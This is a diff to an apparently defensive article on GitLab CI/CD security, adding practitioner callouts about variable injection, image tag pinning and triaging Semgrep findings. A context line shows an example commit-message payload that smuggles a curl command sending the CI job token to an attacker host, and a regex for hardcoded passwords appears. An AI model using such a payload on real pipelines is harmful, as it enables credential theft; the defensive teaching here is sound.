@@ -118,6 +118,8 @@ GitLab CI `script:` blocks run in a shell. If a variable expanded inside a scrip
 
 For example: a job that runs `echo "Deploying ${CI_COMMIT_MESSAGE}"` and the commit message is `; curl attacker.com/exfil?token=$CI_JOB_TOKEN`. The token leaves the network and the job still succeeds.
 
+> **From a real engagement:** While reviewing a GitLab pipeline during a security assessment, I found `$CI_MERGE_REQUEST_TITLE` being expanded directly inside a `before_script` block that ran on all branches — including merge requests opened by external contributors. The variable content came entirely from the person opening the MR. The team had masked the variable (so it wouldn't appear in logs) but hadn't considered that masking has nothing to do with where the value originates. The remediation wasn't to sanitise the value inside the script — it was to remove the variable from the shell context entirely and pass it only where it was structurally needed.
+
 ### Issue 2 — Hardcoded secrets in CI configuration
 
 Credentials appear in pipeline configuration in forms that aren't always obvious: embedded in inline scripts, concatenated into URLs, or written to log artifacts as part of debug output. They also appear in source files called from pipeline jobs — deploy scripts, database migration scripts, health check scripts. These are often checked into version control, making the secret persistent even after rotation.
@@ -127,6 +129,8 @@ Credentials appear in pipeline configuration in forms that aren't always obvious
 `FROM python:3.11` in a Dockerfile resolves to whatever the registry serves under that tag at build time. Tags are mutable — a maintainer can push a different image under the same tag without changing your configuration. If the upstream image is compromised, every build that runs after that point pulls the compromised image.
 
 Digest pinning is the fix: `FROM python:3.11@sha256:abc123...` locks to a specific image by its cryptographic hash. That hash cannot be reassigned; the image is immutable. The same principle applies to GitHub Actions (`uses: actions/checkout@v4` vs `uses: actions/checkout@abc123...`) and package dependencies.
+
+> **Why this is easy to miss:** In practice, pipelines with floating tags pass every build for months or years — until they don't. The breakage when a tag moves isn't "the image is compromised"; it's usually "the build broke for no reason we can find." The security risk hides inside what looks like an ops problem. When I've reviewed pipelines for this, the most common finding is a pinned application image but a floating CI tooling image — the team pinned what they wrote but not what they pulled from upstream.
 
 ### Issue 4 — GitLab variable scope: masked but not protected
 
@@ -158,6 +162,8 @@ The difference matters. A regex looking for `password\s*=\s*"[^"]+"` will find a
 
 These cover the obvious, well-documented patterns. What they don't cover are the gaps between languages: CI YAML as a code surface, Terraform provider version pinning, multi-stage Dockerfile ARG leakage, or the GitLab variable scope issue described above.
 
+> **What actually happens when a scan stage blocks a build:** The first time I wired Semgrep into a real pipeline with `--error` (not `--warning`), it caught 18 legitimate findings on the first run — style violations, a `subprocess.run(shell=True)` in a utility script, and a hardcoded string that matched the secrets pattern. The immediate instinct is to add them all to `.semgrepignore` and move on. The right call is to triage: the subprocess finding was real and got fixed; the secrets pattern was a false positive on a test fixture and got a targeted suppression comment with a note explaining why. That triage process is where the value of static analysis actually lands — not the scan itself, but what you do with the results.
+
 ### How Semgrep rules are written
 
 Each rule is a YAML file with a pattern, a message, a severity, and an optional set of paths to include or exclude. The pattern is written in pseudocode that looks like the language being analysed. Semgrep fills in the gaps — `$VAR` is a wildcard that matches any variable name; `...` matches any number of statements.
@@ -179,7 +185,7 @@ rules:
 
 ## 6. Custom rules for modern infrastructure
 
-The default Semgrep packs were written for traditional application code. Modern infrastructure — containerised builds, Terraform-managed cloud resources, GitLab pipelines with AI coding agents — has patterns the defaults don't reach. The following are custom rules written to address those gaps.
+The default Semgrep packs were written for traditional application code. Modern infrastructure — containerised builds, Terraform-managed cloud resources, GitLab pipelines with external tool integrations — has patterns the defaults don't reach. The following are custom rules written to address those gaps.
 
 ---
 
